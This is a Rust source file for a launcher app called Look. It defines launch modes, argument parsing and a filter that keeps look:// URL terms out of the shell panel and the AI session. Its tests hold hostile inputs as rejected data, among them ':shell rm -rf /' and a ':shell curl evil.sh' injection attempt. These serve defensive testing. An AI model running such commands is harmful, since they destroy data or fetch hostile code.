//! Launch modes: the names a command line or a URL uses to open Look already in
//! a particular mode (`lookapp clipboard`).
//!
//! One rule for every row: the query is `prefix` followed by the term. Adding a
//! mode is adding a row; a shell that needs a `match` over mode names has
//! bypassed this table.

/// A field rather than a `#[cfg]` so `--list-modes` can say "macOS only"
/// instead of pretending the mode does not exist.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Platforms {
    All,
    MacOnly,
}

impl Platforms {
    pub fn note(self) -> Option<&'static str> {
        match self {
            Platforms::All => None,
            Platforms::MacOnly => Some("macOS only"),
        }
    }
}

#[derive(Clone, Copy, Debug)]
pub struct Mode {
    pub name: &'static str,
    pub aliases: &'static [&'static str],
    /// Text placed in the input. A term is appended to it verbatim.
    pub prefix: &'static str,
    pub platforms: Platforms,
    /// One line, for `--list-modes`.
    pub about: &'static str,
}

impl Mode {
    pub fn query(&self, term: &str) -> String {
        format!("{}{}", self.prefix, term)
    }
}

/// Listed in this order. The `:` rows keep their trailing space: it is the
/// jump's trigger, not padding.
pub const MODES: &[Mode] = &[
    Mode {
        name: "clipboard",
        aliases: &["clip", "cb"],
        prefix: "c\"",
        platforms: Platforms::All,
        about: "clipboard history",
    },
    Mode {
        name: "apps",
        aliases: &["app"],
        prefix: "a\"",
        platforms: Platforms::All,
        about: "applications only",
    },
    Mode {
        name: "files",
        aliases: &["file"],
        prefix: "f\"",
        platforms: Platforms::All,
        about: "files only",
    },
    Mode {
        name: "folders",
        aliases: &["folder", "dirs"],
        prefix: "d\"",
        platforms: Platforms::All,
        about: "folders only",
    },
    Mode {
        name: "recent",
        aliases: &[],
        prefix: "rc\"",
        platforms: Platforms::MacOnly,
        about: "recent files and folders, newest first",
    },
    Mode {
        name: "regex",
        aliases: &["re"],
        prefix: "r\"",
        platforms: Platforms::All,
        about: "regex search",
    },
    Mode {
        name: "translate",
        aliases: &["tr"],
        prefix: "t\"",
        platforms: Platforms::All,
        about: "quick translation",
    },
    Mode {
        name: "dictionary",
        aliases: &["dict"],
        prefix: "tw\"",
        platforms: Platforms::All,
        about: "dictionary lookup",
    },
    Mode {
        name: "calc",
        aliases: &["calculator"],
        prefix: ":calc ",
        platforms: Platforms::All,
        about: "calculator panel",
    },
    Mode {
        name: "pomo",
        aliases: &["pomodoro"],
        prefix: ":pomo ",
        platforms: Platforms::All,
        about: "pomodoro timer",
    },
    Mode {
        name: "todo",
        aliases: &[],
        prefix: ":todo ",
        platforms: Platforms::All,
        about: "daily tasks",
    },
    Mode {
        name: "speed",
        aliases: &[],
        prefix: ":speed ",
        platforms: Platforms::All,
        about: "network speed test",
    },
    Mode {
        name: "kill",
        aliases: &[],
        prefix: ":kill ",
        platforms: Platforms::All,
        about: "running processes",
    },
    Mode {
        name: "shell",
        aliases: &[],
        prefix: ":shell ",
        platforms: Platforms::All,
        about: "shell command",
    },
    Mode {
        name: "sys",
        aliases: &[],
        prefix: ":sys ",
        platforms: Platforms::All,
        about: "system info",
    },
    Mode {
        name: "ai",
        aliases: &["chat", "ask"],
        prefix: ">",
        platforms: Platforms::MacOnly,
        about: "AI session",
    },
];

/// The single resolution point: an unmatched name is where a future fallback
/// goes (user-declared blocks are the obvious candidate), which only stays
/// possible while callers ask here instead of matching names themselves.
pub fn resolve(name: &str) -> Option<&'static Mode> {
    let wanted = name.trim();
    if wanted.is_empty() {
        return None;
    }
    MODES.iter().find(|mode| {
        mode.name.eq_ignore_ascii_case(wanted)
            || mode
                .aliases
                .iter()
                .any(|alias| alias.eq_ignore_ascii_case(wanted))
    })
}

/// A term from the `look://` scheme is literal search text and nothing else: no
/// command panel (`:`), no AI session (`>`), no quote to re-target the prefix.
/// The URL is reachable from content the user did not write; argv is not, and
/// is not filtered by this.
///
/// Trimmed first, or one leading space walks `:shell` straight through.
pub fn url_term_is_safe(term: &str) -> bool {
    let trimmed = term.trim_start();
    !(trimmed.starts_with(':') || trimmed.starts_with('>') || term.contains('"'))
}

/// Rendered in core so both shells print the same listing.
pub fn list_text() -> String {
    let width = MODES.iter().map(|mode| mode.name.len()).max().unwrap_or(0);
    let mut out = String::new();
    for mode in MODES {
        let aliases = if mode.aliases.is_empty() {
            String::new()
        } else {
            format!(" ({})", mode.aliases.join(", "))
        };
        let note = mode
            .platforms
            .note()
            .map(|note| format!(" [{note}]"))
            .unwrap_or_default();
        out.push_str(&format!(
            "{:<width$}  {}{aliases}{note}\n",
            mode.name, mode.about
        ));
    }
    out
}

/// For tooling, so a picker or shell completion never hardcodes the list.
pub fn list_json() -> String {
    let rows: Vec<serde_json::Value> = MODES
        .iter()
        .map(|mode| {
            serde_json::json!({
                "name": mode.name,
                "aliases": mode.aliases,
                "prefix": mode.prefix,
                "about": mode.about,
                "platforms": match mode.platforms {
                    Platforms::All => "all",
                    Platforms::MacOnly => "macos",
                },
            })
        })
        .collect();
    serde_json::to_string_pretty(&rows).unwrap_or_else(|_| "[]".to_string())
}

/// What a command line asked for. Parsed in core so `clipboard` cannot mean one
/// thing on Linux and another on macOS.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Launch {
    /// Open as today. Unrecognised arguments land here, which is what keeps
    /// existing autostart lines working.
    Normal,
    Query {
        text: String,
        toggle: bool,
    },
    ListModes,
    /// Named a mode and got it wrong. An error because they were specific,
    /// unlike a bare word that just means "open".
    UnknownMode(String),
}

/// Arguments after the program name. Precedence: `--list-modes`, `--mode`,
/// `--query`, then a bare mode name.
pub fn parse_args<I, S>(args: I) -> Launch
where
    I: IntoIterator<Item = S>,
    S: AsRef<str>,
{
    let args: Vec<String> = args
        .into_iter()
        .map(|arg| arg.as_ref().to_string())
        .collect();

    let mut positionals: Vec<String> = Vec::new();
    let mut mode_name: Option<String> = None;
    let mut query: Option<String> = None;
    let mut list_modes = false;
    let mut saw_mode_flag = false;
    let mut toggle = true;

    let mut index = 0;
    while index < args.len() {
        let arg = args[index].clone();
        match arg.as_str() {
            "--list-modes" => list_modes = true,
            "--no-toggle" => toggle = false,
            "--mode" => {
                saw_mode_flag = true;
                if let Some(value) = args.get(index + 1)
                    && !value.starts_with('-')
                {
                    mode_name = Some(value.clone());
                    index += 1;
                }
            }
            "--query" => {
                if let Some(value) = args.get(index + 1) {
                    query = Some(value.clone());
                    index += 1;
                }
            }
            other if !other.starts_with('-') => positionals.push(other.to_string()),
            _ => {}
        }
        index += 1;
    }

    // `--mode` with no name lists rather than erroring: a keybinding has no
    // terminal, so the useful failure is the one that teaches.
    if list_modes || (saw_mode_flag && mode_name.is_none()) {
        return Launch::ListModes;
    }

    if let Some(name) = mode_name {
        return match resolve(&name) {
            Some(mode) => Launch::Query {
                text: mode.query(&positionals.join(" ")),
                toggle,
            },
            None => Launch::UnknownMode(name),
        };
    }

    if let Some(text) = query {
        return Launch::Query { text, toggle };
    }

    if let Some((first, rest)) = positionals.split_first()
        && let Some(mode) = resolve(first)
    {
        return Launch::Query {
            text: mode.query(&rest.join(" ")),
            toggle,
        };
    }

    Launch::Normal
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_mode_resolves_by_name_and_by_alias() {
        assert_eq!(resolve("clipboard").unwrap().name, "clipboard");
        assert_eq!(resolve("clip").unwrap().name, "clipboard");
        assert_eq!(resolve("cb").unwrap().name, "clipboard");
    }

    #[test]
    fn resolution_ignores_case_and_surrounding_space() {
        assert_eq!(resolve("Clipboard").unwrap().name, "clipboard");
        assert_eq!(resolve("  CLIP  ").unwrap().name, "clipboard");
    }

    #[test]
    fn an_unknown_name_resolves_to_nothing_rather_than_guessing() {
        assert!(resolve("clipbaord").is_none());
        assert!(resolve("").is_none());
        assert!(resolve("   ").is_none());
    }

    #[test]
    fn a_term_is_appended_to_the_prefix() {
        assert_eq!(resolve("clip").unwrap().query("password"), "c\"password");
        assert_eq!(resolve("calc").unwrap().query("2+2"), ":calc 2+2");
        assert_eq!(resolve("clip").unwrap().query(""), "c\"");
    }

    /// A row whose prefix is not real grammar ships as a mode that opens an
    /// empty search, which reads as the feature being broken.
    #[test]
    fn every_prefix_is_grammar_the_app_actually_parses() {
        for mode in MODES {
            let query_prefix = mode.prefix.ends_with('"');
            // The trailing space is the `:` jump's trigger, not decoration.
            let command_jump = mode.prefix.starts_with(':') && mode.prefix.ends_with(' ');
            let session = mode.prefix == ">";

            assert!(
                query_prefix || command_jump || session,
                "mode {} has prefix {:?}, which is none of: a query prefix ending in a quote, \
                 a `:command ` jump with its trailing space, or the `>` session",
                mode.name,
                mode.prefix
            );
        }
    }

    #[test]
    fn no_two_rows_answer_to_the_same_word() {
        let mut seen = std::collections::HashSet::new();
        for mode in MODES {
            assert!(seen.insert(mode.name), "duplicate mode name: {}", mode.name);
            for alias in mode.aliases {
                assert!(
                    seen.insert(alias),
                    "alias {alias} collides with another mode or alias"
                );
            }
        }
    }

    #[test]
    fn a_url_term_may_not_reach_a_command_panel_or_the_session() {
        assert!(!url_term_is_safe(":shell rm -rf /"));
        assert!(!url_term_is_safe(">summarize this"));
        // The quote would re-target the search onto a different prefix.
        assert!(!url_term_is_safe("x\"y"));
    }

    #[test]
    fn leading_space_does_not_smuggle_a_command_past_the_check() {
        assert!(!url_term_is_safe("   :shell curl evil.sh"));
        assert!(!url_term_is_safe("\t>chat"));
    }

    #[test]
    fn ordinary_search_text_is_allowed_through() {
        assert!(url_term_is_safe("password"));
        assert!(url_term_is_safe("quarterly report 2026"));
        assert!(url_term_is_safe("a:b"));
        assert!(url_term_is_safe(""));
    }

    fn parse(args: &[&str]) -> Launch {
        parse_args(args.iter().copied())
    }

    fn shown(text: &str) -> Launch {
        Launch::Query {
            text: text.to_string(),
            toggle: true,
        }
    }

    #[test]
    fn a_bare_mode_name_opens_that_mode() {
        assert_eq!(parse(&["clipboard"]), shown("c\""));
        assert_eq!(parse(&["clip"]), shown("c\""));
    }

    #[test]
    fn a_term_rides_along_with_the_mode() {
        assert_eq!(parse(&["clipboard", "password"]), shown("c\"password"));
        assert_eq!(
            parse(&["--mode", "clipboard", "quarterly", "report"]),
            shown("c\"quarterly report")
        );
    }

    /// Every WM autostart line in the README depends on this.
    #[test]
    fn an_unrecognised_bare_word_still_just_opens_look() {
        assert_eq!(parse(&["clipbaord"]), Launch::Normal);
        assert_eq!(parse(&[]), Launch::Normal);
        assert_eq!(parse(&["--some-future-flag"]), Launch::Normal);
    }

    #[test]
    fn an_explicit_unknown_mode_is_an_error() {
        assert_eq!(
            parse(&["--mode", "clipbaord"]),
            Launch::UnknownMode("clipbaord".to_string())
        );
    }

    #[test]
    fn asking_for_a_mode_without_naming_one_lists_them() {
        assert_eq!(parse(&["--mode"]), Launch::ListModes);
        assert_eq!(parse(&["--list-modes"]), Launch::ListModes);
        // A flag after `--mode` is not a mode name.
        assert_eq!(parse(&["--mode", "--no-toggle"]), Launch::ListModes);
    }

    #[test]
    fn query_passes_grammar_through_untouched() {
        assert_eq!(parse(&["--query", "c\"secret"]), shown("c\"secret"));
        assert_eq!(parse(&["--query", ":shell ls"]), shown(":shell ls"));
    }

    #[test]
    fn no_toggle_survives_wherever_it_is_written() {
        let expected = Launch::Query {
            text: "c\"".to_string(),
            toggle: false,
        };
        assert_eq!(parse(&["clipboard", "--no-toggle"]), expected);
        assert_eq!(parse(&["--no-toggle", "clipboard"]), expected);
    }

    #[test]
    fn an_explicit_mode_wins_over_a_positional() {
        assert_eq!(parse(&["--mode", "calc", "2+2"]), shown(":calc 2+2"));
    }

    /// An alias that goes unlisted is a way in nobody can find.
    #[test]
    fn the_listing_names_every_mode_and_alias() {
        let listing = list_text();
        for mode in MODES {
            assert!(listing.contains(mode.name), "missing mode {}", mode.name);
            for alias in mode.aliases {
                assert!(listing.contains(alias), "missing alias {alias}");
            }
        }
    }

    #[test]
    fn the_listing_says_where_a_mode_is_unavailable() {
        let listing = list_text();
        let ai_line = listing
            .lines()
            .find(|line| line.starts_with("ai "))
            .expect("ai should be listed");

        assert!(
            ai_line.contains("macOS only"),
            "a Linux user should learn the mode exists and why it is not theirs: {ai_line}"
        );
    }

    /// Locked because neither shell's crate compiles everywhere. The plugin
    /// hands over a `Vec<String>` including argv[0], hence the skip.
    #[test]
    fn the_iterator_shapes_the_shells_use_all_compile() {
        let forwarded: Vec<String> = vec!["lookapp".into(), "clipboard".into(), "pass".into()];
        assert_eq!(
            parse_args(forwarded.iter().skip(1)),
            shown("c\"pass"),
            "a Vec<String> argv with the program name skipped"
        );

        let owned: Vec<String> = vec!["clip".into()];
        assert_eq!(parse_args(owned.into_iter()), shown("c\""));

        assert_eq!(parse_args(["clip"].iter().copied()), shown("c\""));
        assert_eq!(
            parse_args(std::env::args().skip(usize::MAX)),
            Launch::Normal
        );
    }

    #[test]
    fn the_json_listing_is_valid_and_complete() {
        let parsed: serde_json::Value =
            serde_json::from_str(&list_json()).expect("should be valid JSON");

        assert_eq!(
            parsed.as_array().expect("should be an array").len(),
            MODES.len()
        );
    }
}
